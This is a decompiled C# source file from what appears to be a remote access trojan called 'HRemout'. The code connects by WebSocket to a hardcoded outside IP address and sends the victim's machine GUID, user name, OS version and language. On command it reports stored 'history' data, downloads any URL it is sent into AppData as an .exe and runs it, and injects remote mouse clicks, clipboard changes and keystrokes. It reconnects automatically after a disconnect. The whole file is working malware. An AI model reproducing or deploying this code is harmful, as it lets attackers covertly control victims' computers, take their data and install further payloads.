using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text.RegularExpressions;
using System.Threading;
using HRemout.ControlWindow;
using HRemout.Networking;
using HRemout.UserInFo;
using WebSocketSharp;

namespace HRemout.Soket;

internal class Soket
{
	public static ManualResetEvent mre = new ManualResetEvent(initialState: false);

	public static Thread sd = new Thread((ThreadStart)delegate
	{
		Program.start();
	});

	private string guid = GetINFo.GetMachineGuid();

	private string user = GetINFo.userNameAndMachine();

	private string win = GetINFo.WindowsVersion();

	public static WebSocket ws = new WebSocket("ws://185.212.148.63:8182/?guid=" + GetINFo.GetMachineGuid() + "&user=" + GetINFo.userNameAndMachine() + "&win=" + GetINFo.WindowsVersion() + "&admin=admin&detect=" + GetINFo.Detect() + "&lang=" + GetINFo.language() + "&group=VSers", new string[0]);

	public static void Connect()
	{
		ws.add_OnMessage((EventHandler<MessageEventArgs>)delegate(object sender, MessageEventArgs e)
		{
			if (e.get_Data() == "Connected:" + GetINFo.GetMachineGuid())
			{
				mre.Set();
			}
			else if (e.get_Data() == "History")
			{
				ws.Send("History:" + Convert.FromBase64String(GetINFo.DetectV2()));
			}
			else if (e.get_Data() == "Disconnected")
			{
				mre.Reset();
			}
			else
			{
				if (e.get_Data().Contains("http"))
				{
					using WebClient webClient = new WebClient();
					try
					{
						if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Path.GetFileName(e.get_Data()) + ".exe"))
						{
							webClient.DownloadFile(e.get_Data(), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Path.GetFileName(e.get_Data()) + ".exe");
							Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Path.GetFileName(e.get_Data()) + ".exe");
						}
					}
					catch
					{
					}
				}
				if (e.get_Data().Contains("DClick:y:"))
				{
					Match match = Regex.Match(e.get_Data(), "y:(.*)x:(.*)");
					Control.mainWindow(Convert.ToInt32(match.Groups[2].Value), Convert.ToInt32(match.Groups[1].Value), WhoClick: false);
				}
				else if (e.get_Data().Contains("Click:y:"))
				{
					Control.ClipboarDd("");
					Match match2 = Regex.Match(e.get_Data(), "y:(.*)x:(.*)");
					Control.mainWindow(Convert.ToInt32(match2.Groups[2].Value), Convert.ToInt32(match2.Groups[1].Value), WhoClick: true);
				}
				else if (e.get_Data().Contains("Keyboard:"))
				{
					Control.keyDown(Regex.Match(e.get_Data(), ":(.*)").Groups[1].Value);
				}
			}
		});
		ws.add_OnOpen((EventHandler)delegate
		{
			Console.WriteLine("good");
		});
		ws.add_OnClose((EventHandler<CloseEventArgs>)delegate
		{
			do
			{
				Thread.Sleep(3000);
			}
			while (!CheckConnect.CheckForInternetConnection());
			Console.WriteLine("error");
			ws.ConnectAsync();
		});
		ws.ConnectAsync();
	}

	public static void WsOnOnClose(object sender, CloseEventArgs e)
	{
		if (!e.get_WasClean() && !ws.get_IsAlive())
		{
			Thread.Sleep(10000);
			ws.Connect();
		}
	}
}
